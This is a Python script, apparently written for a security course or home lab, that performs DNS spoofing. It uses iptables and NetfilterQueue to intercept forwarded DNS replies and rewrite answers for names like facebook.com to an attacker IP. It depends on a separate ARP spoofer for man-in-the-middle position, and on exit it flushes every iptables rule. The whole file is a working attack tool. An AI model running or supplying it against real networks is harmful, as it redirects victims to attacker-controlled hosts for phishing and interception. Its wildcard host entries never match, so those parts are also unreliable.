#!/usr/bin/env python
# In order to use dns spoofer program, you need to run ARP SPOOFER

import scapy.all as scapy
from netfilterqueue import NetfilterQueue  # To access the packets matched by the iptables rule
import os # to run the iptables command

hosts = { # dictionary containing the Domain names to spoof and the local IP of the attacker machine
    # b”example.com” : “Attacker's IP”
    b"www.*.": "10.0.2.15",
    b"*.com": "10.0.2.15",
    b"facebook.com.": "10.0.2.15"
}


# handling requests and responses
def pkt_process(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # DNSRR (Resource record) to edit the request and DNSQR (Question Record) to edit the Response.
    if scapy_packet.haslayer(scapy.DNSRR):

        print("[Before Modification ]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After Modification ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    # accept the packets
    packet.accept()
    # if we want to drop the packets use:-
    # packet.drop()


# modifying the results
def modify_packet(packet):
    qname = packet[scapy.DNSQR].qname
    if qname not in hosts:
        print("Invalid DNS Host:", qname)
        return packet
    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=hosts[qname])
    # to test we can test if our program is running or not by ping
    packet[scapy.DNS].ancount = 1

    # removing some fields so that scapy can recalculate them
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum

    return packet


QUEUE_NUM = 123
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
q = NetfilterQueue()
try:
    q.bind(QUEUE_NUM, pkt_process)
    q.run()
except KeyboardInterrupt:
    os.system("iptables --flush")

